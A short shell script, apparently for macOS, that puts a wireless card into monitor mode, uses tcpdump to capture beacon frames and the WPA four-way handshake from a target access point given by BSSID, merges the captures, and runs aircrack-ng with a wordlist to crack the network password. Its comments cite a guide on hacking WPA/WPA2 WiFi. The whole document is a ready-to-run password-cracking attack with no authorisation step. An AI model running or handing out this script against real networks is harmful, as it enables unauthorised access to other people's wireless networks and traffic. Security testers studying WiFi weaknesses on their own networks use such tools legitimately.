# Based on:
# Capturing WPA Handshakes:
# 		http://www.saltwaterc.eu/capturing-wpa-handshakes-with-os-x.html
# How can I Hacking a WPA/WPA2 WiFi Network Using Mac OS X Yosemite:
# 		https://www.youtube.com/watch?v=G6MXOzGIJZ4
#

sudo -v
export NETWORKCARD=$1
export BSSID=$2


export FILE_BEACON='tmp/'$NETWORKCARD'_'$BSSID'_beacon.cap'
export FILE_EAPOL='tmp/'$NETWORKCARD'_'$BSSID'_eapol.cap'
export FILE_HANDSHAKE='tmp/'$NETWORKCARD'_'$BSSID'_handshake.cap'
export FILE_HIDDEN_FILE_HANDSHAKE='tmp/'$NETWORKCARD'_'$BSSID'_hidden_handshake.cap'
export FILE_COMBINE='tmp/'$NETWORKCARD'_'$BSSID'_handshake_combine.cap'

echo ""
echo "listening on wifi card: $NETWORKCARD to SSID: $BSSID"
echo ""
echo "[==>"

tcpdump "(type mgt subtype proberesp or ether proto 0x888e) and ether host $BSSID" -I -U -vvv -i $NETWORKCARD -w $FILE_HIDDEN_FILE_HANDSHAKE
echo "[====>"
tcpdump "(type mgt subtype assocreq or ether proto 0x888e) and ether host $BSSID" -U -vvv -i $NETWORKCARD -w $FILE_COMBINE
echo "[======>"
# capture a beacon frame from the AP
echo "capture a beacon frame from the AP to file: tmp/beacon.cap"
tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 24 -i $NETWORKCARD -w $FILE_BEACON
echo "[========>"
# wait for the WPA handshake
echo "wait for the WPA handshake to file: tmp/eapol.cap"
tcpdump "ether proto 0x888e and ether host $BSSID" -I  -c 4 -U -vvv -i $NETWORKCARD -w $FILE_EAPOL
echo "[==========>"
# Merge the beacon.cap and the eapol.cap captures.
echo "Merge the beacon.cap and the eapol.cap captures."
mergecap -a -F pcap -w $FILE_HANDSHAKE $FILE_BEACON $FILE_EAPOL
echo "[==========]"
aircrack-ng -w tmp/wordlist tmp/*.cap

read -p "Should we clear and remove tmp cap files. Are you sure? (y/n) " -n 1;
echo "";
if [[ $REPLY =~ ^[Yy]$ ]]; then
	rm -r tmp/*.cap
fi;



